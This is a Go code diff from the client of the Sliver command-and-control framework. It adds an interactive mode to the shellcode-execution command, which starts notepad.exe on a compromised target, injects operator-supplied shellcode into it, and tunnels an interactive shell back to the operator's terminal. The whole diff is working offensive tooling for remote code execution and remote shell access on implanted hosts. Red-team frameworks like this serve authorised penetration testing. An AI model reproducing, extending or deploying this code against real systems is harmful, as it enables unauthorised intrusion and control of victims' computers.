@@ -23,6 +23,7 @@ import (
 	"debug/pe"
 	"encoding/binary"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"os"
@@ -30,15 +31,17 @@ import (
 	"strings"
 	"time"
 
+	"github.com/bishopfox/sliver/client/core"
 	"github.com/bishopfox/sliver/client/spin"
 	clientpb "github.com/bishopfox/sliver/protobuf/client"
 	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"
+	"golang.org/x/crypto/ssh/terminal"
 
 	"github.com/desertbit/grumble"
 	"github.com/golang/protobuf/proto"
 )
 
-func executeShellcode(ctx *grumble.Context, rpc RPCServer) {
+func executeShellcode(ctx *grumble.Context, server *core.SliverServer) {
 
 	activeSliver := ActiveSliver.Sliver
 	if activeSliver == nil {
@@ -50,11 +53,16 @@ func executeShellcode(ctx *grumble.Context, rpc RPCServer) {
 		fmt.Printf(Warn + "You must provide a path to the shellcode\n")
 		return
 	}
+	interactive := ctx.Flags.Bool("interactive")
 	pid := ctx.Flags.Uint("pid")
 	shellcodePath := ctx.Args[0]
 	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
 	if err != nil {
 		fmt.Printf(Warn+"Error: %s\n", err.Error())
+	}
+	if interactive {
+		executeInteractive(ctx, `c:\windows\system32\notepad.exe`, shellcodeBin, server)
+		return
 	}
 	ctrl := make(chan bool)
 	msg := fmt.Sprintf("Sending shellcode to %s ...", activeSliver.Name)
@@ -65,7 +73,7 @@ func executeShellcode(ctx *grumble.Context, rpc RPCServer) {
 		RwxPages: ctx.Flags.Bool("rwx-pages"),
 		Pid:      uint32(pid),
 	})
-	resp := <-rpc(&sliverpb.Envelope{
+	resp := <-server.RPC(&sliverpb.Envelope{
 		Type: clientpb.MsgTask,
 		Data: data,
 	}, defaultTimeout)
@@ -75,6 +83,105 @@ func executeShellcode(ctx *grumble.Context, rpc RPCServer) {
 		fmt.Printf(Warn+"%s\n", resp.Err)
 	}
 	fmt.Printf(Info + "Executed payload on target\n")
+}
+
+func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte, server *core.SliverServer) {
+	fmt.Printf(Info + "Opening shell tunnel (EOF to exit) ...\n\n")
+	noPty := false
+	if ActiveSliver.Sliver.OS == windows {
+		noPty = true // Windows of course doesn't have PTYs
+	}
+	tunnel, err := server.CreateTunnel(ActiveSliver.Sliver.ID, defaultTimeout)
+	if err != nil {
+		log.Printf(Warn+"%s", err)
+		return
+	}
+
+	shellReqData, _ := proto.Marshal(&sliverpb.ShellReq{
+		SliverID:  ActiveSliver.Sliver.ID,
+		EnablePTY: !noPty,
+		TunnelID:  tunnel.ID,
+		Path:      hostProc,
+	})
+	resp := <-server.RPC(&sliverpb.Envelope{
+		Type: sliverpb.MsgShellReq,
+		Data: shellReqData,
+	}, defaultTimeout)
+	if resp.Err != "" {
+		fmt.Printf(Warn+"Error: %s", resp.Err)
+		return
+	}
+	shellResp := &sliverpb.Shell{}
+	err = proto.Unmarshal(resp.Data, shellResp)
+	if err != nil {
+		fmt.Printf(Warn+"Error unmarshaling data: %v", err)
+		return
+	}
+
+	pid := shellResp.Pid
+	ctrl := make(chan bool)
+	msg := fmt.Sprintf("Sending shellcode to %s ...", ActiveSliver.Sliver.Name)
+	go spin.Until(msg, ctrl)
+	data, _ := proto.Marshal(&clientpb.TaskReq{
+		Data:     shellcode,
+		SliverID: ActiveSliver.Sliver.ID,
+		RwxPages: ctx.Flags.Bool("rwx-pages"),
+		Pid:      uint32(pid),
+	})
+	resp = <-server.RPC(&sliverpb.Envelope{
+		Type: clientpb.MsgTask,
+		Data: data,
+	}, defaultTimeout)
+	ctrl <- true
+	<-ctrl
+	if resp.Err != "" {
+		fmt.Printf(Warn+"%s\n", resp.Err)
+	}
+
+	var oldState *terminal.State
+	if !noPty {
+		oldState, err = terminal.MakeRaw(0)
+		log.Printf("Saving terminal state: %v", oldState)
+		if err != nil {
+			fmt.Printf(Warn + "Failed to save terminal state")
+			return
+		}
+	}
+
+	readBuf := make([]byte, 128)
+
+	cleanup := func() {
+		log.Printf("[client] cleanup tunnel %d", tunnel.ID)
+		tunnelClose, _ := proto.Marshal(&sliverpb.ShellReq{
+			TunnelID: tunnel.ID,
+		})
+		server.RPC(&sliverpb.Envelope{
+			Type: sliverpb.MsgTunnelClose,
+			Data: tunnelClose,
+		}, defaultTimeout)
+		if !noPty {
+			log.Printf("Restoring old terminal state: %v", oldState)
+			terminal.Restore(0, oldState)
+		}
+	}
+
+	go func() {
+		defer cleanup()
+		for data := range tunnel.Recv {
+			log.Printf("[write] %v", string(data))
+			os.Stdout.Write(data)
+		}
+	}()
+
+	for {
+		n, err := os.Stdin.Read(readBuf)
+		if err == io.EOF {
+			break
+		}
+		if err == nil && 0 < n {
+			tunnel.Send(readBuf[:n])
+		}
+	}
 }
 
 func migrate(ctx *grumble.Context, rpc RPCServer) {
